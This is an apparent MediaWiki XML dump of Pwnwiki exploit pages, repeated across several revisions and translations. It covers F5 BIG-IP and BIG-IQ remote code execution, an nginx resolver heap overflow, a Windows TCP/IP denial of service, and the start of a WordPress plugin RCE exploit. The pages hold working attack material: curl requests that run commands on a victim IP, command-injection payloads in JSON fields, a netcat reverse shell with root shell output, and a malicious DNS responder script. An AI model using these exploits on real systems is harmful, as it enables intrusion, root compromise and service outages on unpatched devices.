BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	14.x 	14.1.0 – 14.1.3 	14.1.4
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	13.x 	13.1.0 – 13.1.3 	13.1.3.6
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	12.x 	12.1.0 – 12.1.5 	12.1.5.3*
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	11.x 	None 	Not applicable
BIG-IQ Centralized Management 	8.x 	None 	8.0.0
BIG-IQ Centralized Management 	7.x 	7.1.0, 7.0.0 	7.1.0.3, 7.0.0.2
BIG-IQ Centralized Management 	6.x 	6.0.0 – 6.1.0 	None
&lt;/pre&gt;

==POC==
&lt;pre&gt;
curl -su admin: -H "Content-Type: application/json" http://[victimIP]/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}'
&lt;/pre&gt;</text>
      <sha1>9znpkm7pjhcf5dyvg4pexevlfmu3bjl</sha1>
    </revision>
    <revision>
      <id>397</id>
      <parentid>396</parentid>
      <timestamp>2021-03-18T09:29:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>397</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1409" sha1="lq6q73bobcnt4714a2odvi0yec9m0m8" xml:space="preserve">&lt;languages   /&gt;

&lt;translate&gt;
==漏洞危害== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:2--&gt;
*執行任意系統命令
*創建或刪除文件
*禁用服務 
&lt;/translate&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:3--&gt;
&lt;/translate&gt;
&lt;pre&gt;
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	16.x 	16.0.0 – 16.0.1 	16.0.1.1
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	15.x 	15.1.0 – 15.1.2 	15.1.2.1
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	14.x 	14.1.0 – 14.1.3 	14.1.4
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	13.x 	13.1.0 – 13.1.3 	13.1.3.6
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	12.x 	12.1.0 – 12.1.5 	12.1.5.3*
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	11.x 	None 	Not applicable
BIG-IQ Centralized Management 	8.x 	None 	8.0.0
BIG-IQ Centralized Management 	7.x 	7.1.0, 7.0.0 	7.1.0.3, 7.0.0.2
BIG-IQ Centralized Management 	6.x 	6.0.0 – 6.1.0 	None
&lt;/pre&gt;

==POC==
&lt;pre&gt;
curl -su admin: -H "Content-Type: application/json" http://[victimIP]/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}'
&lt;/pre&gt;</text>
      <sha1>lq6q73bobcnt4714a2odvi0yec9m0m8</sha1>
    </revision>
    <revision>
      <id>402</id>
      <parentid>397</parentid>
      <timestamp>2021-03-18T09:31:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>402</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1728" sha1="94dy3d9q1sy7fl97nhz6w4oqgz51l0u" xml:space="preserve">&lt;languages   /&gt;

&lt;translate&gt;
==漏洞危害== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:2--&gt;
*執行任意系統命令
*創建或刪除文件
*禁用服務 
&lt;/translate&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:3--&gt;
&lt;/translate&gt;
&lt;pre&gt;
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	16.x 	16.0.0 – 16.0.1 	16.0.1.1
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	15.x 	15.1.0 – 15.1.2 	15.1.2.1
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	14.x 	14.1.0 – 14.1.3 	14.1.4
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	13.x 	13.1.0 – 13.1.3 	13.1.3.6
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	12.x 	12.1.0 – 12.1.5 	12.1.5.3*
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	11.x 	None 	Not applicable
BIG-IQ Centralized Management 	8.x 	None 	8.0.0
BIG-IQ Centralized Management 	7.x 	7.1.0, 7.0.0 	7.1.0.3, 7.0.0.2
BIG-IQ Centralized Management 	6.x 	6.0.0 – 6.1.0 	None
&lt;/pre&gt;

==POC==
1.
&lt;pre&gt;
curl -su admin: -H "Content-Type: application/json" http://[victimIP]/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}'
&lt;/pre&gt;
2.
&lt;pre&gt;
curl -ks https://[victimIP]/mgmt/shared/authn/login -d '{"bigipAuthCookie":"","loginReference":{"link":"http://localhost/mgmt/tm/access/bundle-install-tasks"},"filePath":"`id`"}'
&lt;/pre&gt;
3.
&lt;pre&gt;
curl -ksu admin:[redacted] https://[vimtimIP]/mgmt/tm/access/bundle-install-tasks -d '{"filePath":"id"}'
&lt;/pre&gt;</text>
      <sha1>94dy3d9q1sy7fl97nhz6w4oqgz51l0u</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22986 F5 BIG-IP iControl RCE漏洞/uk</title>
    <ns>0</ns>
    <id>311</id>
    <revision>
      <id>467</id>
      <timestamp>2021-03-19T11:20:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22986 F5 Вразливість BIG-IP iControl RCE"</comment>
      <origin>467</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1461" sha1="sgvmpsyra621o1fhgyd56frbg7hu0py" xml:space="preserve">&lt;languages   /&gt;

== Небезпека вразливості ==

* Виконайте будь-яку системну команду
* Створення або видалення файлів
* Відключити послугу 

== Постраждала версія ==
&lt;pre&gt;
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	16.x 	16.0.0 – 16.0.1 	16.0.1.1
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	15.x 	15.1.0 – 15.1.2 	15.1.2.1
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	14.x 	14.1.0 – 14.1.3 	14.1.4
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	13.x 	13.1.0 – 13.1.3 	13.1.3.6
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	12.x 	12.1.0 – 12.1.5 	12.1.5.3*
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	11.x 	None 	Not applicable
BIG-IQ Centralized Management 	8.x 	None 	8.0.0
BIG-IQ Centralized Management 	7.x 	7.1.0, 7.0.0 	7.1.0.3, 7.0.0.2
BIG-IQ Centralized Management 	6.x 	6.0.0 – 6.1.0 	None
&lt;/pre&gt;

==POC==
&lt;pre&gt;
curl -su admin: -H "Content-Type: application/json" http://[victimIP]/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}'
&lt;/pre&gt;</text>
      <sha1>sgvmpsyra621o1fhgyd56frbg7hu0py</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-23024 F5 BIG-IQ VE 8.0.0-2923215 RCE漏洞</title>
    <ns>0</ns>
    <id>5129</id>
    <revision>
      <id>5871</id>
      <timestamp>2021-06-24T09:23:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; F5 BIG-IQ VE v8.0.0-2923215 Post-auth Remote Root RCE  CVE-2021-23024  ======= Details =======  It was possible to execute commands with root privileges as an authentica..."</comment>
      <origin>5871</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3599" sha1="3a869bkin30cnirv46h2wza91pz7z0b" xml:space="preserve">&lt;pre&gt;
F5 BIG-IQ VE v8.0.0-2923215 Post-auth Remote Root RCE

CVE-2021-23024

=======
Details
=======

It was possible to execute commands with root privileges as an authenticated privileged user via command injection in easy-setup-test-connection.

There are two blind command injection bugs in Test DNS Connection and Test NTP Connection features, which make request to mgmt/shared/system/easy-setup-test-connection.

User accounts tested for calling the API:

- Admin
- User + Administrator Role

SSH is enabled by default for the root user, but the system does not intend the admin account to gain a shell access:

admin:x:0:500:Admin User:/home/admin:/bin/false

But an admin (or a user with admin-like privileges) can elevate privileges to root and gain a shell via command injection in the web portal.

=====
Repro
=====

https://bigiq/ui/system/this-device/dns-ntp/dns-ntp-edit

Modify and replay back the dnsServerAddresses JSON field.

=======
Request
=======

PUT /mgmt/shared/system/easy-setup-test-connection HTTP/1.1
X-F5-Auth-Token: eyJraW.....
.....

{"dnsServerAddresses":["$(id&gt;/tmp/id)"],"ntpServerAddresses":[]}

or

{"dnsServerAddresses":["8.8.8.8"],"ntpServerAddresses":["$(whoami)"]}

========
Response
========

HTTP/1.1 400 Bad Request
Server: webd
.....

{"code":400,"message":"Dns $(id&gt;/tmp/id) is not valid\n","originalRequestBody":"{\"dnsServerAddresses\":[\"$(id&gt;/tmp/id)\"],\"ntpServerAddresses\":[]}","referer":"https://bigiq/ui/system/this-device/dns-ntp/dns-ntp-edit","restOperationId":2101063,"errorStack":[],"kind":":resterrorresponse"}

and repectively

{"code":400,"message":"NTP $(whoami) is not valid\n","originalRequestBody":"{\"dnsServerAddresses\":[\"8.8.8.8\"],\"ntpServerAddresses\":[\"$(whoami)\"]}","referer":"https://bigiq/ui/system/this-device/dns-ntp/dns-ntp-edit","restOperationId":2149253,"errorStack":[],"kind":":resterrorresponse"}

=============
Execution Log
=============

DNS:

pid=7349 executed [/bin/sh -c  dig +short +time=5 +tries=1 @$(id&gt;/tmp/id) ]
pid=7351 executed [id ]
pid=7349 executed [dig +short +time=5 +tries=1 @ ]

[root@big:ModuleNotLicensed::LICENSE INOPERATIVE:Standalone] config # cat /tmp/id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0

NTP:

pid=1288 executed [/bin/sh -c dig +short +time=5 +tries=1 @8.8.8.8  $(whoami) ]
pid=1290 executed [whoami ]
pid=1288 executed [dig +short +time=5 +tries=1 @8.8.8.8 root ]

============
Exploitation
============

The netcat binary with -e support is installed on the system already making a remote shell easy for demo.

A command such as this will provide the connection to our client listener: "nc 10.0.0.100 5000 -e /bin/bash" while on the client we will drop into a root shell on the bigiq server.

$ nc -l -p 5000
... connection receieved

python -c 'import pty; pty.spawn("/bin/bash")'

[@big:ModuleNotLicensed::LICENSE INOPERATIVE:Standalone] restjavad # pwd

/var/service/restjavad

[@big:ModuleNotLicensed::LICENSE INOPERATIVE:Standalone] restjavad # id

uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0

[@big:ModuleNotLicensed::LICENSE INOPERATIVE:Standalone] restjavad # ps
.....
32320 ?        S      0:00 su elasticsearch -s /bin/bash -c export JAVA_HOME=/usr/lib/jvm/jre-1.8.0-openjdk.x86_64;export ES_JAVA_OPTS='-Xms6000m -Xmx6000m';export ES_PATH_CONF=/var/config/rest/elasticsearch/config;exec bin/elasticsearch &gt;/dev/null 2&gt;&amp;1
32335 tty1     S      0:00 python -c import pty; pty.spawn("/bin/bash")
32336 pts/0    Ss     0:00 /bin/bash

===
Fix
===

https://support.f5.com/csp/article/K06024431
&lt;/pre&gt;</text>
      <sha1>3a869bkin30cnirv46h2wza91pz7z0b</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-23097 Nginx解析器 Off-by-One堆寫入漏洞</title>
    <ns>0</ns>
    <id>4425</id>
    <revision>
      <id>5097</id>
      <timestamp>2021-06-15T14:48:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; 0.6.18 - 1.20.0 &lt;/pre&gt;  ==POC== &lt;pre&gt; from binascii import hexlify, unhexlify from socket import AF_INET, SOCK_DG..."</comment>
      <origin>5097</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1137" sha1="bg1ehn5cgl8agww192iq4512t1yjd5p" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
0.6.18 - 1.20.0
&lt;/pre&gt;

==POC==
&lt;pre&gt;
from binascii import hexlify, unhexlify
from socket import AF_INET, SOCK_DGRAM, socket
from struct import unpack

sock = socket(AF_INET, SOCK_DGRAM)
sock.bind(('0.0.0.0', 1053))

while True:
    request, addr = sock.recvfrom(4096)
    print(b'&lt;&lt;&lt; '+hexlify(request))
    ident = request[0:2]
    # find request
    nullptr = request.find(0x0,12)
    reqname = request[12:request.find(0x0,12)+1]
    reqtype = request[nullptr+1:nullptr+3]
    reqclass = request[nullptr+3:nullptr+5]
    print('name: %s, type: %s, class: %s' % (reqname, unpack('&gt;H', reqtype), unpack('&gt;H', reqclass)))
    # CNAME response
    response = request[0:2] + \
               unhexlify('''81800001000100000000''') + \
               reqname + reqtype + reqclass + \
               unhexlify('c00c0005000100000e10000b18414141414141414141414141414141414141414141414141c004')
    print(b'&gt;&gt;&gt; '+hexlify(response))
    sock.sendto(bytes(response), addr)
&lt;/pre&gt;

&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://github.com/x41sec/advisories/blob/master/X41-2021-002/poc.py</text>
      <sha1>bg1ehn5cgl8agww192iq4512t1yjd5p</sha1>
    </revision>
    <revision>
      <id>5098</id>
      <parentid>5097</parentid>
      <timestamp>2021-06-15T14:48:40Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5098</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1159" sha1="1kxgcjwiabtr6haf0re6sgcl3lhic00" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
0.6.18 - 1.20.0
&lt;/pre&gt;

==POC==
&lt;pre&gt;
from binascii import hexlify, unhexlify
from socket import AF_INET, SOCK_DGRAM, socket
from struct import unpack

sock = socket(AF_INET, SOCK_DGRAM)
sock.bind(('0.0.0.0', 1053))

while True:
    request, addr = sock.recvfrom(4096)
    print(b'&lt;&lt;&lt; '+hexlify(request))
    ident = request[0:2]
    # find request
    nullptr = request.find(0x0,12)
    reqname = request[12:request.find(0x0,12)+1]
    reqtype = request[nullptr+1:nullptr+3]
    reqclass = request[nullptr+3:nullptr+5]
    print('name: %s, type: %s, class: %s' % (reqname, unpack('&gt;H', reqtype), unpack('&gt;H', reqclass)))
    # CNAME response
    response = request[0:2] + \
               unhexlify('''81800001000100000000''') + \
               reqname + reqtype + reqclass + \
               unhexlify('c00c0005000100000e10000b18414141414141414141414141414141414141414141414141c004')
    print(b'&gt;&gt;&gt; '+hexlify(response))
    sock.sendto(bytes(response), addr)
&lt;/pre&gt;

&lt;translate&gt;
==參考== &lt;!--T:2--&gt;
&lt;/translate&gt;
https://github.com/x41sec/advisories/blob/master/X41-2021-002/poc.py</text>
      <sha1>1kxgcjwiabtr6haf0re6sgcl3lhic00</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-23097 Nginx解析器 Off-by-One堆寫入漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4432</id>
    <revision>
      <id>5105</id>
      <timestamp>2021-06-15T14:49:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-23097 Nginx解析器 Off-by-One堆写入漏洞"</comment>
      <origin>5105</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1087" sha1="hg7lbndwewjsgbaznowvdwzuara78hm" xml:space="preserve">&lt;languages /&gt;
==影响版本==
&lt;pre&gt;
0.6.18 - 1.20.0
&lt;/pre&gt;

==POC==
&lt;pre&gt;
from binascii import hexlify, unhexlify
from socket import AF_INET, SOCK_DGRAM, socket
from struct import unpack

sock = socket(AF_INET, SOCK_DGRAM)
sock.bind(('0.0.0.0', 1053))

while True:
    request, addr = sock.recvfrom(4096)
    print(b'&lt;&lt;&lt; '+hexlify(request))
    ident = request[0:2]
    # find request
    nullptr = request.find(0x0,12)
    reqname = request[12:request.find(0x0,12)+1]
    reqtype = request[nullptr+1:nullptr+3]
    reqclass = request[nullptr+3:nullptr+5]
    print('name: %s, type: %s, class: %s' % (reqname, unpack('&gt;H', reqtype), unpack('&gt;H', reqclass)))
    # CNAME response
    response = request[0:2] + \
               unhexlify('''81800001000100000000''') + \
               reqname + reqtype + reqclass + \
               unhexlify('c00c0005000100000e10000b18414141414141414141414141414141414141414141414141c004')
    print(b'&gt;&gt;&gt; '+hexlify(response))
    sock.sendto(bytes(response), addr)
&lt;/pre&gt;

==参考==
https://github.com/x41sec/advisories/blob/master/X41-2021-002/poc.py</text>
      <sha1>hg7lbndwewjsgbaznowvdwzuara78hm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-23097 Nginx解析器 Off-by-One堆寫入漏洞/zh-tw</title>
    <ns>0</ns>
    <id>5087</id>
    <revision>
      <id>5827</id>
      <timestamp>2021-06-24T02:21:45Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本=="</comment>
      <origin>5827</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1087" sha1="qwpwyzawgbtnaxupqoeil3mk36c9z8n" xml:space="preserve">&lt;languages /&gt;
==影響版本==
&lt;pre&gt;
0.6.18 - 1.20.0
&lt;/pre&gt;

==POC==
&lt;pre&gt;
from binascii import hexlify, unhexlify
from socket import AF_INET, SOCK_DGRAM, socket
from struct import unpack

sock = socket(AF_INET, SOCK_DGRAM)
sock.bind(('0.0.0.0', 1053))

while True:
    request, addr = sock.recvfrom(4096)
    print(b'&lt;&lt;&lt; '+hexlify(request))
    ident = request[0:2]
    # find request
    nullptr = request.find(0x0,12)
    reqname = request[12:request.find(0x0,12)+1]
    reqtype = request[nullptr+1:nullptr+3]
    reqclass = request[nullptr+3:nullptr+5]
    print('name: %s, type: %s, class: %s' % (reqname, unpack('&gt;H', reqtype), unpack('&gt;H', reqclass)))
    # CNAME response
    response = request[0:2] + \
               unhexlify('''81800001000100000000''') + \
               reqname + reqtype + reqclass + \
               unhexlify('c00c0005000100000e10000b18414141414141414141414141414141414141414141414141c004')
    print(b'&gt;&gt;&gt; '+hexlify(response))
    sock.sendto(bytes(response), addr)
&lt;/pre&gt;

==參考==
https://github.com/x41sec/advisories/blob/master/X41-2021-002/poc.py</text>
      <sha1>qwpwyzawgbtnaxupqoeil3mk36c9z8n</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24086 Windows TCP/IP拒絕服務漏洞</title>
    <ns>0</ns>
    <id>880</id>
    <revision>
      <id>1143</id>
      <timestamp>2021-04-07T14:13:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages     /&gt;  &lt;translate&gt; ==GIF演示== &lt;/translate&gt; [[File:Trigger.gif |800px]]  ==Usage== &lt;pre&gt; over@bubuntu:~$ sudo python3 cve-2021-24086.py 66 fragments, total size..."</comment>
      <origin>1143</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="343" sha1="61l1p45s1vpxf87m91njfvoyfroie9r" xml:space="preserve">&lt;languages     /&gt;

&lt;translate&gt;
==GIF演示==
&lt;/translate&gt;
[[File:Trigger.gif |800px]]

==Usage==
&lt;pre&gt;
over@bubuntu:~$ sudo python3 cve-2021-24086.py
66 fragments, total size 0xfff8
..................................................................
Sent 66 packets.
.
Sent 1 packets.
&lt;/pre&gt;


==POC==
https://github.com/0vercl0k/CVE-2021-24086</text>
      <sha1>61l1p45s1vpxf87m91njfvoyfroie9r</sha1>
    </revision>
    <revision>
      <id>1144</id>
      <parentid>1143</parentid>
      <timestamp>2021-04-07T14:14:45Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>/* GIF演示 */</comment>
      <origin>1144</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="344" sha1="gfr7xgqjq3crli6k689uutofr3kgxei" xml:space="preserve">&lt;languages     /&gt;

&lt;translate&gt;
==GIF演示==
&lt;/translate&gt;
[[File:Trigger.gif | 700px]]

==Usage==
&lt;pre&gt;
over@bubuntu:~$ sudo python3 cve-2021-24086.py
66 fragments, total size 0xfff8
..................................................................
Sent 66 packets.
.
Sent 1 packets.
&lt;/pre&gt;


==POC==
https://github.com/0vercl0k/CVE-2021-24086</text>
      <sha1>gfr7xgqjq3crli6k689uutofr3kgxei</sha1>
    </revision>
    <revision>
      <id>1145</id>
      <parentid>1144</parentid>
      <timestamp>2021-04-07T14:15:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>/* GIF演示 */</comment>
      <origin>1145</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="429" sha1="9avrj6k2sm6ngbisqprz5jve1lffzt2" xml:space="preserve">&lt;languages     /&gt;

&lt;translate&gt;
==GIF演示==
&lt;/translate&gt;
[[File:Trigger.gif | 700px]]
&lt;translate&gt;
[https://www.pwnwiki.org/images/f/f8/Trigger.gif 載入GIF]
&lt;/translate&gt;

==Usage==
&lt;pre&gt;
over@bubuntu:~$ sudo python3 cve-2021-24086.py
66 fragments, total size 0xfff8
..................................................................
Sent 66 packets.
.
Sent 1 packets.
&lt;/pre&gt;


==POC==
https://github.com/0vercl0k/CVE-2021-24086</text>
      <sha1>9avrj6k2sm6ngbisqprz5jve1lffzt2</sha1>
    </revision>
    <revision>
      <id>1146</id>
      <parentid>1145</parentid>
      <timestamp>2021-04-07T14:16:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>/* GIF演示 */</comment>
      <origin>1146</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="430" sha1="ghlnq2lngd995p02f6ph2vo4lk8epoz" xml:space="preserve">&lt;languages     /&gt;

&lt;translate&gt;
==GIF演示==
&lt;/translate&gt;
[[File:Trigger.gif | 700px]]

&lt;translate&gt;
[https://www.pwnwiki.org/images/f/f8/Trigger.gif 載入GIF]
&lt;/translate&gt;

==Usage==
&lt;pre&gt;
over@bubuntu:~$ sudo python3 cve-2021-24086.py
66 fragments, total size 0xfff8
..................................................................
Sent 66 packets.
.
Sent 1 packets.
&lt;/pre&gt;


==POC==
https://github.com/0vercl0k/CVE-2021-24086</text>
      <sha1>ghlnq2lngd995p02f6ph2vo4lk8epoz</sha1>
    </revision>
    <revision>
      <id>1147</id>
      <parentid>1146</parentid>
      <timestamp>2021-04-07T14:16:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>1147</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="452" sha1="0rcee9psyg3na6d9fsp1e0yf141btrm" xml:space="preserve">&lt;languages     /&gt;

&lt;translate&gt;
==GIF演示== &lt;!--T:1--&gt;
&lt;/translate&gt;
[[File:Trigger.gif | 700px]]

&lt;translate&gt;
&lt;!--T:2--&gt;
[https://www.pwnwiki.org/images/f/f8/Trigger.gif 載入GIF]
&lt;/translate&gt;

==Usage==
&lt;pre&gt;
over@bubuntu:~$ sudo python3 cve-2021-24086.py
66 fragments, total size 0xfff8
..................................................................
Sent 66 packets.
.
Sent 1 packets.
&lt;/pre&gt;


==POC==
https://github.com/0vercl0k/CVE-2021-24086</text>
      <sha1>0rcee9psyg3na6d9fsp1e0yf141btrm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24086 Windows TCP/IP拒絕服務漏洞/en</title>
    <ns>0</ns>
    <id>4088</id>
    <revision>
      <id>4705</id>
      <timestamp>2021-06-10T04:03:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-24086 Windows TCP/IP Denial of Service Vulnerability"</comment>
      <origin>4705</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="378" sha1="scrvlbt03ne5dk31af0aesmr73dzv7i" xml:space="preserve">&lt;languages     /&gt;

==GIF Demo==
[[File:Trigger.gif | 700px]]

[https://www.pwnwiki.org/images/f/f8/Trigger.gif Load GIF]

==Usage==
&lt;pre&gt;
over@bubuntu:~$ sudo python3 cve-2021-24086.py
66 fragments, total size 0xfff8
..................................................................
Sent 66 packets.
.
Sent 1 packets.
&lt;/pre&gt;


==POC==
https://github.com/0vercl0k/CVE-2021-24086</text>
      <sha1>scrvlbt03ne5dk31af0aesmr73dzv7i</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24086 Windows TCP/IP拒絕服務漏洞/es</title>
    <ns>0</ns>
    <id>887</id>
    <revision>
      <id>1154</id>
      <timestamp>2021-04-07T14:18:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Demostración GIF =="</comment>
      <origin>1154</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="391" sha1="3espayw9t966fqt4dfmv3ut8p8uarup" xml:space="preserve">&lt;languages     /&gt;

== Demostración GIF ==
[[File:Trigger.gif | 700px]]

[https://www.pwnwiki.org/images/f/f8/Trigger.gif Cargar GIF]

==Usage==
&lt;pre&gt;
over@bubuntu:~$ sudo python3 cve-2021-24086.py
66 fragments, total size 0xfff8
..................................................................
Sent 66 packets.
.
Sent 1 packets.
&lt;/pre&gt;


==POC==
https://github.com/0vercl0k/CVE-2021-24086</text>
      <sha1>3espayw9t966fqt4dfmv3ut8p8uarup</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24145 Wordpress Plugin Modern Events Calendar 5.16.2 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>5385</id>
    <revision>
      <id>6179</id>
      <timestamp>2021-07-03T01:58:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; Version: Before 5.16.5   ==EXP== &lt;pre&gt; # Exploit Title: Wordpress Plugin Modern Events Calendar 5.16.2 - Remote Code Ex..."</comment>
      <origin>6179</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="22150" sha1="ms5mwy7yeespjspq9dbzcclks9f41al" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
Version: Before 5.16.5


==EXP==
&lt;pre&gt;
# Exploit Title: Wordpress Plugin Modern Events Calendar 5.16.2 - Remote Code Execution (Authenticated)
# Date 01.07.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://webnus.net/modern-events-calendar/
# Software Link: https://downloads.wordpress.org/plugin/modern-events-calendar-lite.5.16.2.zip
# Version: Before 5.16.5
# Tested on: Ubuntu 18.04
# CVE: CVE-2021-24145
# CWE: CWE-434
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24145/README.md

'''
Description:
Arbitrary file upload in the Modern Events Calendar Lite WordPress plugin, versions before 5.16.5,
did not properly check the imported file, allowing PHP ones to be uploaded by administrator by using the 'text/csv'
content-type in the request.
'''


'''
Banner:
'''
banner = """
  ______     _______     ____   ___ ____  _      ____  _  _   _ _  _  ____  
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \| || | / | || || ___| 
